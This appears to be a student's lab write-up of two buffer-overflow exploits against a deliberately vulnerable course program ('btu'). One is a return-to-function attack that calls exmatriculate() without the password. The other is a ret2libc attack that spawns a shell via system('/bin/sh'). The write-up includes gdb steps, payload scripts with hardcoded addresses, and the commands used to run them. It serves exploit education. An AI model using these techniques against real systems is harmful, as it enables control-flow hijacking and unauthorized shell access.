# Task 3.1 : Attacking Non-Executable Stack
- Our goal is Exploit the `remove` function to **call a different function (`exmatriculate`)** _without knowing the password_ and _without injecting shellcode_.
## Steps and Exploit Plan
- To call `exmatriculate(unsigned int id)` manually through the stack, we must fake a function call by **setting up the stack exactly as the compiler would**.
     - In C++ on x86: Member functions receive the object pointer (`this`) as the first argument (in memory, pushed last).
     - The actual function argument(s) (e.g. `id`) are pushed after that.
     - The return address is placed just after the vulnerable buffer and saved EBP.
- So we need to 
     - Find the address of the `exmatriculate()` function.
     - Overflow the password buffer to overwrite the return address.
     - Replace it with the address of `exmatriculate()` — a **return-to-function attack**.
     - Pass it the correct `student_id` (e.g., Klaus Komisch's ID).
     - Cleanly exit the program using a call to `exit()`.

## First : Understand the Function Signature
```
void University::exmatriculate(unsigned int id)
```
This function needs **two things to work properly**:
1. A valid `this` pointer to the `University` object (so it knows which instance it's acting on)
2. A valid `id` as argument (in this case: `1782914303`)

## 1. Now  Find the address of the `exmatriculate()` function.
```
gdb --args ./build/bin/btu remove 2468  dummy   
p University::exmatriculate
```
![[Pasted image 20250603183827.png]]
## 2.  `exit()` function address
- After `exmatriculate()` finishes, the program would normally "return" — so the next address on the stack is where it jumps.
- If we don’t control this, the program will crash or segfault.
- We provide the address of `exit()` as the **return address after `exmatriculate()`**, so the program exits cleanly.
```
gdb --args ./build/bin/btu remove 2468  dummy   
run
p &exit
```
![[Pasted image 20250603184009.png]]
## 3. Address of the global `University` object (`btu`)
- `exmatriculate()` is a **member function** — it needs to operate on a `University` object.
- The object is stored in a global variable called `btu`.
- So when the function is called, the `this` pointer must be passed as its first argument (according to C++ calling convention on x86).
```
gdb --args ./build/bin/btu remove 2468  dummy   
run
p &btu
```
![[Pasted image 20250603184922.png]]
## 4. Klaus Komisch’s ID: `1782914303 = 6A451CFF`
- - This is the actual student we want to exmatriculate. 
- In the C++ function call, this is the second argument after `this`.
## The payload
- Instead of using `print()` which adds newlines and encodes data, we use:
```
sys.stdout.buffer.write()
```
- this sends the exact binary payload to `stdout` — and we redirect it to a binary file.
- Final Payload Generator
```
 python3 -c 'import sys; sys.stdout.buffer.write(
    b"\x90"*52 +                      # NOP sled (52 bytes)
    b"\x80\xb0\x04\x08" +             # exmatriculate() → 0x0804b080
    b"\xd0\xaa\xaf\xf7" +             # exit()          → 0xf7afaad0
    b"\x60\x0c\x05\x08" +             # this pointer    → 0x08050c60
    b"\xff\x1c\x45\x6a"               # student ID      → 0x6a451cff
)' > task3payload.bin
```
## Command
```
./build/bin/btu remove 2468 "$(cat task3payload.bin)"
```
## Result
![[Pasted image 20250603190218.png]]
# Task 3.2 : Ret2libc: Spawn a Shell with `system("/bin/sh")`
- In this task, instead of calling a program function like `exmatriculate()`, we will:
     - **Call the `system()` function from libc with the argument `"/bin/sh"`**
     - **NX** prevents injected shellcode.
     - But we can **reuse existing code** in libc.
     - `system("/bin/sh")` is a one-line way to get a shell.
     - Just like before, we overflow the buffer and hijack control flow.
## Step-by-Step Setup
### Step 1: Find Address of `system()` in libc
```
gdb --args ./build/bin/btu remove 2468  dummy  
run
p &system
```
![[Pasted image 20250603193609.png]]

### Find Address of `exit()` in libc

```
p &exit
```
![[Pasted image 20250603193642.png]]
### Step 3: Find Address of `"/bin/sh"` in memory
- Run this in your terminal **before launching GDB**:
```
export MYSHELL=/bin/sh
export SHELL=/bin/sh
```
- now go to gdb 
```
gdb --args ./build/bin/btu remove 2468 test
b main
r
find "/bin/sh"
```
![[Pasted image 20250603203133.png]]
### Python script for payload
```
#!/usr/bin/python3
from sys import stdout

payload = bytearray()

# Fill buffer (32 bytes) + saved EBP (4 bytes) + 16 to reach return and arguments
payload += b"\x90" * 52

# Overwrite RET → system()
payload += (0xf7b0e220).to_bytes(4, 'little')

# Return from system() → exit()
payload += (0xf7afaad0).to_bytes(4, 'little')

# Argument for system(): pointer to "/bin/sh"
payload += (0xffffdf8d).to_bytes(4, 'little')

stdout.buffer.write(payload)
```
- then 
### Command
```
python3 task3.2.py > payloadtask3.2.bin  
gdb --args ./build/bin/btu remove 1234 "$(cat payloadtask3.2.bin)"
```
![[Pasted image 20250603203509.png]]
- and we got a shell